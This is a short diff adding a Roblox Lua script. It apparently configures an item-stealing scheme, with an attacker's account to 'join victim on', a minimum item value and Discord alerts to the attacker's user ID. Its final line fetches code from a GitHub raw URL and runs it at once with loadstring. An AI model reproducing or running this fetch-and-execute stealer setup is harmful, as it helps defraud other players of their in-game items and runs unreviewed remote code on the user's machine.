@@ -1,0 +1,6 @@
+_G.Username = "ivansfarmingaccount" -- user you should join victim on
+_G.min_value = 0.5
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "438668302458290187" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicScript1/Keyless/refs/heads/main/test", true))()
